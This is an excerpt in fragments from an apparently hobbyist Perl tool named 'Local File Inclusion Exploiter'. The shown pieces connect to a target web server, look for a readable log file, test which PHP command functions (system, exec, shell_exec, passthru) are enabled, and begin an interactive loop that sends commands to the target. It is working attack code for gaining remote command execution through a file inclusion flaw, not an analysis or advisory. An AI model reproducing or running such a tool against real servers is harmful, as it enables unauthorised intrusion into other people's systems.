...
sub Header()
{
	print q {Local File Inclusion Exploiter - By r0ut3r (writ3r [at] gmail.com)
-------------------------------------------------------------------
};
}
...
#print "$path\n";
	...
	while (<$sock>)
	{
		...
		if (/Permission denied/) {
			print "[-] Log file found, but permission was denied to read file. [".$path."] \n"; }
...
$xpl_test = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect. Exiting...\r\n";
...
while (<$xpl_test>)
{
	if (/system\(\) has been disabled for security/)
	{
		...
		if ($enabled_funct eq false) {
		print "[-] No enabled cmd function found. Tried system(), exec(), shell_exec(), passthru()\n"; exit(); }
	}
}
...
while ($cmd !~ "exit")
{
	$scmd = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect. Exiting...\r\n";
